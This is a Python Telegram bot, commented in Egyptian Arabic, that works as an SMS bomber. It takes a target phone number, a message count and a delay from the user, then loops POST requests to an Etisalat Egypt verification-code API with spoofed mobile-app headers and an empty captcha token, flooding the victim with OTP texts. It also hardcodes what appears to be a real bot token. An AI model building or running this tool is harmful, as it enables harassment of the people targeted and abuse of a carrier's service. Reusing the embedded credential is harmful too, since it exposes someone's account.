import time
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# حط التوكن بتاع البوت هنا
TOKEN = "8391097394:AAH8h_zyKukYEViOC0g-aUCVT-hCTD8OUVk"

# المراحل
ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

# API Etisalat
URL = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/sendVerCodeQuickAccessV4"
HEADERS = {
    'Host': "mab.etisalat.com.eg:11003",
    'User-Agent': "okhttp/5.0.0-alpha.11",
    'Connection': "Keep-Alive",
    'Accept': "text/xml",
    'Accept-Encoding': "gzip",
    'Content-Type': "application/xml",
    'applicationVersion': "2",
    'applicationName': "MAB",
    'Language': "ar",
    'APP-BuildNumber': "10650",
    'APP-Version': "33.1.0",
    'OS-Type': "Android",
    'OS-Version': "13",
    'APP-STORE': "GOOGLE",
    'C-Type': "4G",
    'Is-Corporate': "false",
    'Content-Type': "text/xml; charset=UTF-8",
    'ADRUM_1': "isMobile:true",
    'ADRUM': "isAjax:true",
}

# بدء المحادثة
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 اهلا! ابعت الرقم اللي عايز تبعتله SMS:")
    return ASK_NUMBER

# استلام الرقم
async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["number"] = update.message.text
    await update.message.reply_text("📨 تمام، ابعت عدد الرسائل اللي عايز تبعتها:")
    return ASK_COUNT

# استلام عدد الرسائل
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data["count"] = int(update.message.text)
        await update.message.reply_text("⏳ حلو، ابعتلي عدد الثواني بين كل رسالة:")
        return ASK_DELAY
    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح. ابعت تاني:")
        return ASK_COUNT

# استلام الثواني وتنفيذ الإرسال
async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = int(update.message.text)
        number = context.user_data["number"]
        count = context.user_data["count"]

        await update.message.reply_text(f"🚀 جاري الإرسال للرقم {number}\n📌 عدد الرسائل: {count}\n⏳ الانتظار: {delay} ثانية")

        for i in range(count):
            payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='no' ?>
            <sendVerCodeQuickAccessRequest>
                <dial>{number}</dial>
                <hCaptchaToken></hCaptchaToken>
                <udid></udid>
            </sendVerCodeQuickAccessRequest>"""

            response = requests.post(URL, data=payload, headers=HEADERS)

            if "true" in response.text.lower():
                await update.message.reply_text(f"✅ SMS رقم {i+1} اتبعتت بنجاح")
            else:
                await update.message.reply_text(f"⚠️ SMS رقم {i+1} فشل")

            time.sleep(delay)

        await update.message.reply_text("🎉 كل الرسائل خلصت ✅")
        return ConversationHandler.END

    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح. ابعت تاني:")
        return ASK_DELAY

# إلغاء
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚫 تم إلغاء العملية.")
    return ConversationHandler.END

# تشغيل البوت
def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()